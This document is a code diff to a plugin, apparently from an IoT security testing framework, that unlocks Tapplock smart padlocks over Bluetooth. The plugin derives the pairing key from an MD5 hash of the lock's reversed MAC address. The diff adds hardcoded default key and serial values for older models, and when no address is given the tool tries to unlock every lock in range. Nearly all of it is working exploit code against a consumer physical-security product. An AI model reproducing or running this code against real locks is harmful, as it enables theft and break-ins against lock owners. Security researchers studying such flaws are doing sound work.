@@ -24,9 +24,13 @@ from hashlib import md5
 
 class TappUnlock(Test):
     TNAMEPREFIX = "TL104A"
-    PAIRPREXIX  = "55AAB4010800"
+    #PAIRPREXIX  = "55AAB4010800"
+    PAIRPREXIX = "55aab4010800"
     UNLOCKCMD   = "55aa810200008201"
     UNLOCKHNDL  = 0xe
+    DEFKEY = "01020304"
+    DEFSERIAL = "00000000"
+    DEFPAIR = PAIRPREXIX + DEFKEY + DEFSERIAL
 
     def __init__(self):
 
@@ -35,7 +39,8 @@ class TappUnlock(Test):
                          descr    = """This plugin allows you to unlock the Tapplocks in close (BLE) proximity.
                                     It was made possible by @cybergibbons research on the same and he was 
                                     kind enough to share his code. NOTE: This plugin needs root privileges.  
-                                    You may run it as $ sudo efconsole""",
+                                    You may run it as $ sudo efconsole. Thanks to @slawekja for providing the default
+                                    key1 (01020304) and serial (00000000) values for earlier version of Tapplock""",
                          author   = "Aseem Jakhar (Original code provided by @cybergibbons)",
                          email    = "aseemjakhar@gmail.com",
                          ref      = ["https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/"],
@@ -49,6 +54,9 @@ class TappUnlock(Test):
         self.argparser.add_argument("-a", "--addr",
                                     help="""BLE Address of specific Tapplock that you want to unlock. If not 
                                             specified, it will scan and attempt to unlock all the Tapplocks found""")
+        self.argparser.add_argument("-d", "--default", action="store_true", default=False,
+                                    help="""Use default key1 (01020304) and Serial (00000000) instead of generating 
+                                            them from the BLE address""")
         self.argparser.add_argument("-t", "--timeout", default=2, type=int,
                                     help="Scan timeout. Default is 2 seconds")
 
@@ -80,23 +88,28 @@ class TappUnlock(Test):
         try:
             TLog.trydo("Unlocking Tapplock ({})".format(mac))
             # Get key1 and serial
-            rmac = ":".join(mac.upper().split(":")[::-1])
-            hash = md5(rmac.encode()).hexdigest()
-            key1 = hash[0:8]
-            serial = hash[16:24]
-            TLog.generic("(Calculated hash={})(key1={})(serial={})".format(hash, key1, serial))
+            pdata = None
+            if self.args.default is False:
+                rmac = ":".join(mac.upper().split(":")[::-1])
+                hash = md5(rmac.encode()).hexdigest()
+                key1 = hash[0:8]
+                serial = hash[16:24]
+                TLog.generic("(Calculated hash={})(key1={})(serial={})".format(hash, key1, serial))
+                pdata = self.PAIRPREXIX + key1 + serial
+            else:
+                TLog.generic("(default key1={})(default serial={})".format(self.DEFKEY, self.DEFSERIAL))
+                pdata = self.DEFPAIR
             # Calculate the checksum
             chksum = 0
-            pdata = self.PAIRPREXIX + key1 + serial
             for byte in bytes.fromhex(pdata):
                 chksum = chksum + (byte % 255)
             chksumstr = "{:04x}".format(chksum)
             # Create the Pairing data
             pdata = pdata + chksumstr[2:4] + chksumstr[0:2]
-            p.connect(mac, addrType=Ble.ADDR_TYPE_PUBLIC)
+            p.connect(mac, addrType=Ble.ADDR_TYPE_RANDOM)
             TLog.trydo("Sending pair data({})".format(pdata))
             p.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(pdata))
             TLog.trydo("Sending unlock command({})".format(self.UNLOCKCMD))
             p.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(self.UNLOCKCMD))
         finally:
-             p.disconnect()
+            p.disconnect()
